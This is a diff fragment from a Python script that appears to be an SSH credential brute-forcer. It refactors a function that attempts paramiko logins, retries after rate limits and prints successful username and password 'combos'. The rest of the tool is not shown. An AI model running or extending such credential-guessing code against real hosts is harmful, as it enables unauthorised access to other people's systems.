@@ -22,20 +22,22 @@ def is_ssh_open(hostname, username, password):
     except socket.timeout:
         # this is when host is unreachable
         print(f"{RED}[!] Host: {hostname} is unreachable, timed out.{RESET}")
-        return False
+        returning = False
     except paramiko.AuthenticationException:
         print(f"[!] Invalid credentials for {username}:{password}")
-        return False
+        returning = False
     except paramiko.SSHException:
         print(f"{BLUE}[*] Quota exceeded, retrying with delay...{RESET}")
         # sleep for a minute
         time.sleep(60)
-        return is_ssh_open(hostname, username, password)
+        returning = is_ssh_open(hostname, username, password)
     else:
         # connection was established successfully
         print(f"{GREEN}[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{RESET}")
+        returning = True
+    finally:
         client.close()
-        return True
+        return returning
 
 
 if __name__ == "__main__":
